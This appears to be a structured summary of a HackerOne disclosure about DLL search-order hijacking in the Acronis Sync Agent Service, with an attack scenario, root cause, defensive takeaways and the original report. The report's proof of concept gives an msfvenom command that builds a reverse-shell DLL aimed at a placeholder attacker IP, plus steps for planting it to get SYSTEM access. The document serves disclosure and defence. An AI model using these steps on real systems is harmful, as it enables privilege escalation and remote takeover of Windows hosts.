# Acronis Sync Agent Service - DLL Search-Order Hijacking Leading to Privilege Escalation

## Metadata
- **Source:** HackerOne
- **Report:** 924493 | https://hackerone.com/reports/924493
- **Submitted:** 2020-07-15
- **Reporter:** vanitas
- **Program:** Acronis
- **Bounty:** Not specified in report
- **Severity:** Critical
- **Vuln:** DLL Hijacking, Insecure DLL Search Order, Privilege Escalation, Arbitrary Code Execution
- **CVEs:** None
- **Category:** auth-crypto

## Summary
Acronis Sync Agent Service (syncagentsrv.exe) loads CSUNSAPI.dll from untrusted locations following insecure search order that includes user-writable directories like C:\Python27. An authenticated user can place a malicious DLL in these directories and achieve code execution with SYSTEM privileges when the service starts.

## Attack scenario
1. Attacker gains authenticated user access to Windows system (member of 'Authenticated Users' group)
2. Attacker identifies that Acronis Sync Agent Service searches for CSUNSAPI.dll in C:\Python27 directory via Process Monitor analysis
3. Attacker confirms C:\Python27 directory is writable by authenticated users
4. Attacker generates malicious DLL using msfvenom with reverse shell payload and names it CSUNSAPI.dll
5. Attacker places malicious CSUNSAPI.dll in C:\Python27 directory
6. Attacker reboots target system or waits for service restart, triggering service to load malicious DLL with SYSTEM privileges

## Root cause
Acronis Sync Agent Service uses insecure DLL search-order that includes user-writable directories in the system PATH (particularly C:\Python27) before checking secured system directories. The service runs with SYSTEM privileges but loads DLLs following standard Windows search order which prioritizes user-accessible paths.

## Attacker mindset
An authenticated user seeking privilege escalation to SYSTEM level would enumerate running services with higher privileges, identify DLL loading behavior through process monitoring, locate writable directories in the DLL search path, and plant a trojanized DLL to achieve code execution with elevated privileges upon service restart.

## Defensive takeaways
- Implement explicit full-path DLL loading instead of relying on search-order mechanism for services running with elevated privileges
- Remove user-writable directories from system PATH or ensure critical services do not search PATH for DLL resolution
- Apply principle of least privilege - evaluate whether Acronis Sync Agent Service requires SYSTEM privileges
- Use code signing and manifest-based DLL loading to enforce authenticated DLL sources
- Monitor and alert on DLL loading from unexpected locations, especially from user-writable directories
- Regularly audit services for insecure DLL loading practices using tools like Process Monitor
- Implement Application Allowlisting to restrict which DLLs can be loaded by privileged services
- Use SetDllDirectory() with specific paths rather than relying on default search order

## Variant hunting
Search for other Acronis services and third-party services that load DLLs from untrusted search paths, particularly those running with elevated privileges. Check for DLL loads from C:\Python27, C:\Python36, or other application directories added to system PATH. Examine other services in 'Acronis True Image' suite for similar patterns.

## MITRE ATT&CK
- T1574.001
- T1547.001
- T1190
- T1548.002

## Notes
The vulnerability is particularly dangerous because: (1) Any authenticated user can exploit it, (2) Exploitation leads directly to SYSTEM-level code execution, (3) Python installation adding itself to system PATH is a common practice that creates the vulnerability window, (4) The service auto-starts on boot, making the attack reliable. The PoC demonstrates working exploitation with reverse shell. Report indicates version 24.6.25700 and potentially earlier versions are affected.

## Full report
<details><summary>Expand</summary>

Vulnerability Explanation :
	An issue was discovered in Acronis Sync Agent service which intregated from Acronis True Image ver.24.6.25700. This service is suffered by incorrect DLL search-order hijacking. The malicious users who are in “Authenticated Users” group can use DLL-Hijacking to execute arbitrary code and do privilege escalation exploit to escalate and gain full system privilege user access and rights over the system.

Vulnerable application version :
	Acronis True Image ver.24.6.25700 (maybe lower are affected too).

PoC Operating System version :
	Microsoft Windows 10 Home - 64 bits with latest patched.

Vulnerability found :
1. Incorrect DLL search-order from syncagentsrv.exe.
2. DLL-Hijacking using CSUNSAPI.dll.	

Lab Environment :
1. Install Python2.7 for windows, we can see C:\Python27 which is default home application of Python2.7 is added to SYSTEM PATH variable. Open from environment variable. [Ref Picture : 01.jpg, 02.jpg]

Vulnerability Finding :
1. See from service : "Acronis Sync Agent Service" can running by execute file : "C:\Program Files (x86)\Common Files\Acronis\SyncAgent\syncagentsrv.exe"
2. Open Process Monitor, to find out how it is doing. Add filter with following criteria : [Ref Picture : 03.jpg]
• Process Name is syncagentsrv.exe (Include)
• Result contains NOT FOUND (Include)
• Path contains C:\Python27 (Include)
• Operation begins with Reg (Exclude)
3. From Process Monitor, we can see suspicious DLL name as : "CSUNSAPI.dll" was called in every folders which are defined in SYSTEM PATH variable. [Ref Picture : 04.jpg]
4. When closely look for this process details, see that C:\Python27\CSUNSAPI.dll was loaded by SYSTEM privilege with 32 bits process. [Ref Picture : 05.jpg, 06.jpg]
This is potential to do privilege escalation exploit using DLL-hijacking

Proof-of-concept exploitation :
1. Use msfvenom tool on Kali-linux to generate malicious DLL file, then save as CSUNSAPI.dll. It will generate shellcode to send reverse shell to attacker when this DLL is loaded to target system as below command. [Ref Picture : 07.jpg]
Command : 
msfvenom -p windows/shell_reverse_tcp LHOST=[Attacker-IP] LPORT=[Attacker-port] -f dll > CSUNSAPI.dll
2. On attacker side (Kali-linux). Start reverse shell listener for receive reverse shell.
3. Transfer malicious DLL file to target server, place CSUNSAPI.dll at C:\Python27. Since this folder is writeable by any of users are in Authenticated Users group, then this low privileged user is allow to place this malicious DLL on this. [Ref Picture : 08.jpg]
4. Reboot lab machine, because this low privilege user don’t have service permission to control Acronis Sync Agent Service. Then we need to reboot target to initial this service again.
5. Get reverse shell as SYSTEM privilege, we can see this reverse shell is spawned by malicious DLL-hijacking. [Ref Picture : 09.jpg, 10.jpg]

## Impact

Impact :
Malicious users are able to gain privilege escalation permission as SYSTEM privilege.

</details>

---
*Analysed by Claude on 2026-05-24*
